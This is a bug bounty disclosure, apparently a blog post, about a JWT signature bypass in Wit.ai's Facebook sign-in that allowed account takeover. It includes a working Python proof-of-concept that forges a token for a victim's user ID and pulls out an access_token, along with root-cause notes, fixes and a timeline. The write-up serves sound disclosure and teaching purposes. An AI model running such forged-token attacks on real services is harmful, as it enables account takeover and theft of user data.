---
title: Takeover any wit.ai account
description: The vulnerability permits an unauthenticated actor to takeover any wit.ai account. The only prerequisite observed is knowledge of the target wit.ai identifier; no additional credentials are required.
author: ramzybouayhya
date: 2019-04-19 11:33:00 +0800
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

## 🧾Description

During routine testing of Wit.ai’s Facebook login integration I discovered a critical vulnerability: the backend accepted JWT `signed_request` tokens without verifying the HMAC-SHA256 signature. This allowed forging a valid `signed_request` by modifying the payload (e.g., `user_id`) and re-signing with any secret. The server relied only on the header & payload and ignored signature verification.

An attacker could impersonate other Facebook users and obtain `access_token`s for their sessions.

---

## Affected endpoint

```
POST https://api.wit.ai/me/facebook_signin
Content-Type: application/x-www-form-urlencoded
Body: signed_request=<JWT_TOKEN>
```

---

## Vulnerability details

- **Type:** JWT signature verification bypass (HMAC-SHA256)
- **Root cause:** The server accepted tokens when header and payload looked correct but failed to validate the signature. The `algorithm` field in the JWT payload/header indicated `HMAC-SHA256`, but the implementation did not verify the HMAC signature against the server-side secret.
- **Impact:** An attacker can craft a JWT with an arbitrary `user_id` and a forged signature (signed with any key) and successfully authenticate as the targeted Facebook user in Wit.ai.

---

## ⚙️ Steps to Reproduce

The following Python script demonstrates creating a forged JWT and submitting it to the endpoint. Replace `victim_id` with the target Facebook user id.

```python
import jwt
import requests
import time
import urllib.parse

# ---------------- CONFIG ----------------
victim_id = "123456789012345"
fake_secret = "anything"
api_url = "https://api.wit.ai/me/facebook_signin"

# ---------------- CREATE FAKE JWT ----------------
payload = {
    "user_id": victim_id,
    "code": "",
    "algorithm": "HMAC-SHA256",
    "issued_at": int(time.time())
}

# Note: using HS256 to sign with arbitrary secret
token = jwt.encode(payload, fake_secret, algorithm="HS256")

# ---------------- SEND REQUEST (form-encoded) ----------------
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://wit.ai",
    "Referer": "https://wit.ai",
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*"
}

data = {
    "signed_request": token
}

encoded_data = urllib.parse.urlencode(data)

print("[*] Sending forged JWT (form-encoded)...")
response = requests.post(api_url, headers=headers, data=encoded_data)

print(f"\n[+] Status Code: {response.status_code}")
try:
    json_response = response.json()
    print("\n[+] Response:")
    print(json_response)

    if "access_token" in json_response:
        print(f"\n[+] Extracted Token: t:{json_response['access_token']}")
    else:
        print("\n[-] No access_token found.")
except Exception as e:
    print("\n[!] Could not decode JSON:")
    print(response.text)
```

**Expected result (before the patch):** the server returns a JSON containing an `access_token` for the targeted `user_id`.

---

## Root cause analysis

The server accepted JWTs based on header & payload inspection but skipped verifying the cryptographic signature. JWTs using HMAC (HS256) require the server to verify the signature with the known secret; failing to do so makes token forgery trivial.

Common implementation mistakes that lead to this class of bug:

- Treating the `algorithm` field in the token as authoritative and trusting it blindly.
- Using JWT libraries incorrectly (for example, decoding without signature verification, e.g., `jwt.decode(token, options={"verify_signature": False})`).
- Accidentally disabling verification in custom parsing logic.

---

## Impact

- Unauthorized account takeover on Wit.ai via Facebook login.
- Potential access to user-specific data, account actions, or any functionality gated by `me/facebook_signin`.

---

## Fix / Mitigation

- **Fix applied by Meta (April 16, 2019):** Enforce signature verification on `signed_request` tokens. The server must verify the HMAC-SHA256 signature using the correct secret before accepting the token.

- **General recommendations for developers:**
  - Always verify JWT signatures using a well-reviewed JWT library with default verification enabled.
  - Never trust the `alg` field in an incoming token—use server-side configuration to select acceptable algorithms and reject tokens that do not match.
  - Use asymmetric signing (RS256/ES256) where appropriate to avoid confusion between server-side secrets and client-provided tokens.
  - Add monitoring and alerts for unexpected authentication flows or token anomalies.

---

## Timeline

- **Reported:** April 8, 2019
- **Triaged:** April 15, 2019
- **Fixed:** April 16, 2019
- **Reward:** April 30, 2019 - $5,000

---